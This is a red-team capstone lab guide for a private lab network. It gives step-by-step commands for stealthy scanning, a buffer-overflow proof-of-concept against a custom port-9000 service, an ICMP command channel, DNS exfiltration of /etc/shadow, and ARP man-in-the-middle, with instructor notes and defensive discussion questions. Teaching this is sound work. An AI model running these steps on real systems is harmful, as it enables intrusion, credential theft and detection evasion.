# Capstone — "Silent Pivot"

## Scenario

You have just obtained shell access to an internal host at `192.168.56.1`.
Your operators want you to:

1. Map the `192.168.56.0/24` segment without triggering Snort signatures
2. Identify a host running a custom binary service on port 9000
3. Exploit a vulnerability in that service
4. Establish a covert C2 channel back to your operator machine
5. Exfiltrate `/etc/shadow` from the target
6. Leave no persistent processes; clean up all artifacts

---

## Network Diagram

```
[Operator]──────────────────────────────────────────────┐
                                                         │ ICMP/DNS only
[Attacker: 192.168.56.1] ──── (192.168.56.0/24) ──── [Target: 192.168.56.2]
                                  │
                            [Other hosts?]
                           (your job to find)
```

---

## Objectives and Scoring

| # | Objective | Points | Hint |
|---|-----------|--------|------|
| 1 | Discover all live hosts on /24 without triggering > 5 Snort alerts | 20 | Use ARP sweep, slow it down |
| 2 | Identify port 9000 service and its protocol | 15 | SYN scan + banner grab |
| 3 | Crash the service with a fuzzer (find the vuln) | 25 | Try opcode 0xFF with long payload |
| 4 | Send a command to target via ICMP and get output back | 20 | ICMP agent must be running |
| 5 | Exfiltrate /etc/shadow to attacker via DNS | 20 | Collector on attacker, sender on target |
| **BONUS** | Clean up: ARP caches restored, no lingering processes | +10 | `pkill`, `arp -d`, verify |

**Total: 100 points (+ 10 bonus)**

---

## Step-by-Step Guide

### Step 1: Stealth Recon

```bash
# ARP sweep (stealthier than ICMP for local /24)
sudo python3 module2/host_discovery.py 192.168.56.0/24 --method arp

# If ARP sweep is blocked, fall back to ICMP with jitter
sudo python3 module2/host_discovery.py 192.168.56.0/24 --method icmp

# Once hosts found, SYN scan port 9000 specifically
sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 9000
```

### Step 2: Service Identification

```bash
# Banner grab on port 9000 using netcat
echo -e '\xdc\x34\x01\x00\x00' | nc -q1 192.168.56.2 9000 | xxd

# Or using the toolkit's recon module:
sudo python3 redteam_toolkit/cli.py recon --target 192.168.56.2 --ports 9000
```

Expected: Magic bytes `0xDC34` in response — this is the DC34 custom protocol.
See `module5/custom_proto.py` for the protocol definition.

### Step 3: Exploit the Service

```bash
# Start the custom fuzzer against port 9000
sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --port 9000

# The fuzzer should find: opcode=0xFF + payload > 64 bytes = crash
# Manual PoC once you identify the bug:
python3 -c "
import struct, socket
magic  = 0xDC34
opcode = 0xFF
length = 100            # > 64 bytes triggers the overflow
payload = b'A' * length
frame = struct.pack('>HBH', magic, opcode, length) + payload
s = socket.create_connection(('192.168.56.2', 9000))
s.sendall(frame)
print('[+] Sent exploit frame')
s.close()
"
```

### Step 4: Establish ICMP C2

```bash
# On target VM — start the agent
sudo python3 module6/icmp_agent.py --iface eth0

# On attacker — connect to the agent
sudo python3 module6/icmp_tunnel.py --target 192.168.56.2

# Test commands:
[192.168.56.2]> whoami
[192.168.56.2]> id
[192.168.56.2]> uname -a
```

### Step 5: DNS Exfiltration

```bash
# On attacker — start the DNS collector
sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/shadow_exfil

# On target (via ICMP C2 or direct shell) — run the exfiltrator
sudo python3 module6/dns_exfil.py --file /etc/shadow --collector 192.168.56.1

# Verify received file on attacker
cat /tmp/shadow_exfil
```

### Step 6: Clean Up

```bash
# Stop ICMP agent on target:
[192.168.56.2]> pkill -f icmp_agent

# If ARP poisoning was used, restore caches:
sudo arp -d 192.168.56.254  # flush gateway entry
sudo arp -d 192.168.56.2    # flush target entry

# Remove any files dropped on target:
[192.168.56.2]> rm -f /tmp/pwned /tmp/*.pcap

# Verify no lingering python processes:
[192.168.56.2]> ps aux | grep python
```

---

## Using the Red Team Toolkit

The `redteam_toolkit/` package wraps all modules into a single CLI:

```bash
# Full recon
sudo python3 redteam_toolkit/cli.py recon --target 192.168.56.0/24

# ARP MitM
sudo python3 redteam_toolkit/cli.py mitm --victim 192.168.56.2 --gateway 192.168.56.254

# Fuzz port 9000
sudo python3 redteam_toolkit/cli.py fuzz --target 192.168.56.2 --port 9000

# ICMP C2
sudo python3 redteam_toolkit/cli.py c2 --target 192.168.56.2

# DNS exfil
sudo python3 redteam_toolkit/cli.py exfil --file /etc/shadow --collector 192.168.56.1
```

---

## Instructor Notes

### Lab Setup for Capstone
1. Start `target_server.py` on target VM: `python3 module5/target_server.py`
2. Start `icmp_agent.py` on target VM: `sudo python3 module6/icmp_agent.py`
3. Optionally enable Snort in IDS mode to add challenge for objective 1
4. Distribute the scoreboard sheet (physical paper works well at DEFCON)

### Common Issues
| Issue | Fix |
|-------|-----|
| ICMP agent not receiving | Check `sudo` and correct iface name |
| DNS collector not seeing queries | Check port 53 not occupied by local dnsmasq: `sudo systemctl stop dnsmasq` |
| Service on 9000 not responding | `python3 module5/target_server.py` on target |
| ARP operations fail | Check `ip link set eth0 promisc on` |

### Discussion Questions (wrap-up)
1. Which step would be hardest to detect in a real SOC environment?
2. How would HTTPS change the MitM attack outcomes?
3. What would a SIEM rule look like to catch the DNS exfiltration?
4. How would you use these same techniques defensively to test your own network?
